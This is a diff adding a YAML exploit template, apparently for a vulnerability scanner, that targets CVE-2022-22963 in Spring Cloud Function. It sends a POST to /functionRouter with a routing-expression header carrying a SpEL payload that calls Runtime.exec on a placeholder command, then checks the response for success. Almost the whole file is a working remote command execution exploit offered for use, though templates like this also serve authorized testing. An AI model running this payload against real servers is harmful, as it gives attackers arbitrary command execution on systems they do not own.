@@ -1,0 +1,38 @@
+id: spring_cloud_rce_cve_2022_22963
+info:
+name: Spring Cloud 3.2.2 - Remote Command Execution (RCE) (CVE-2022-22963)
+date: 2023-07-07
+authors: pwnme
+description: |
+Exploit to execute commands exploiting CVE-2022-22963 in Spring Cloud 3.2.2.
+software_link: https://spring.io/projects/spring-cloud-function/
+vendor_link: https://spring.io/projects/spring-cloud-function
+cve: CVE-2022-22963
+
+requests:
+- name: spring_cloud_rce_cve_2022_22963_exploit
+type: http
+method: POST
+path: /functionRouter
+headers:
+Content-Type: application/json
+spring.cloud.function.routing-expression: 'T(java.lang.Runtime).getRuntime().exec("{{command}}")'
+body: '{"data": ""}'
+description: |
+Exploit request to execute commands exploiting CVE-2022-22963 in Spring Cloud 3.2.2.
+
+# You can customize the target URL and headers as needed.
+# Ensure to replace the "{{command}}" placeholder with the actual command to execute.
+# Also, adjust the Content-Type header based on the application's requirements.
+
+matchers:
+- type: status
+status:
+- 200
+- type: word
+words:
+- "{{command}}" # Adjust the expected output of the command execution if needed.
+part: body
+description: |
+Check if the output of the injected command is reflected in the response.
+Modify the "{{command}}" placeholder to match the command you expect to see. 
